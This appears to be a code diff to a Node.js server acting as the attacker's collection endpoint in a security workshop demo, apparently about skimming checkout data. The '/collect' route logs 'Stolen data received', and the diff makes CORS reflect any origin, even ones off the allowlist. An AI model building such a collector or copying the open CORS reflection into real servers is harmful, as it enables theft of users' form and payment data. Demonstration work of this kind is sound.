@@ -113,7 +113,7 @@ function getPublicAttackerOrigin(req) {
   return `//127.0.0.1:${PORT}`;
 }
 
-const DEFAULT_ORIGIN_SUFFIXES = ['fortinet.demo', 'packetsoprano.com'];
+const DEFAULT_ORIGIN_SUFFIXES = ['fortinet.demo', 'packetsoprano.com', 'fortiworkshop.nl'];
 
 function hostnameMatchesTrustedSuffix(hostname, suffixes) {
   const h = hostname.toLowerCase();
@@ -133,7 +133,7 @@ function corsOriginAllowed(origin) {
     .split(',')
     .map((s) => s.trim())
     .filter(Boolean);
-  if (commaAllow.length) return commaAllow.includes(origin);
+  if (commaAllow.includes(origin)) return true;
 
   const single = (process.env.ALLOWED_ORIGIN || '').trim();
   if (single && origin === single) return true;
@@ -151,21 +151,30 @@ function corsOriginAllowed(origin) {
   }
 }
 
-// Browsers POST from checkout origin; reflect allowed origins behind multi-domain setups.
-const cors = (req, res, next) => {
+function applyCorsHeaders(req, res) {
   const origin = req.headers.origin;
-  const fallback =
-    exactSingleFallback(process.env.ALLOWED_ORIGINS, process.env.ALLOWED_ORIGIN);
-
-  if (origin && corsOriginAllowed(origin)) {
+  if (origin) {
+    if (!corsOriginAllowed(origin)) {
+      console.warn('[CORS] Origin not on allowlist (reflected for demo):', origin);
+    }
     res.setHeader('Access-Control-Allow-Origin', origin);
     res.setHeader('Vary', 'Origin');
-  } else if (fallback) {
+    return;
+  }
+  const fallback = exactSingleFallback(
+    process.env.ALLOWED_ORIGINS,
+    process.env.ALLOWED_ORIGIN
+  );
+  if (fallback) {
     res.setHeader('Access-Control-Allow-Origin', fallback);
   } else {
-    res.setHeader('Access-Control-Allow-Origin', origin || '*');
+    res.setHeader('Access-Control-Allow-Origin', '*');
   }
+}
 
+// Browsers POST from checkout origin; reflect allowed origins behind multi-domain setups.
+const cors = (req, res, next) => {
+  applyCorsHeaders(req, res);
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') return res.sendStatus(204);
@@ -284,16 +293,7 @@ app.post('/collect', (req, res) => {
   collected.push(entry);
   console.log('[COLLECT] Stolen data received:', JSON.stringify(payload, null, 2));
   console.log('[COLLECT] Total entries:', collected.length);
-  const origin = req.headers.origin;
-  if (origin && corsOriginAllowed(origin)) {
-    res.setHeader('Access-Control-Allow-Origin', origin);
-    res.setHeader('Vary', 'Origin');
-  } else {
-    res.setHeader(
-      'Access-Control-Allow-Origin',
-      origin || '*'
-    );
-  }
+  applyCorsHeaders(req, res);
   res.status(200).json({ success: true, received: timestamp });
 });
 
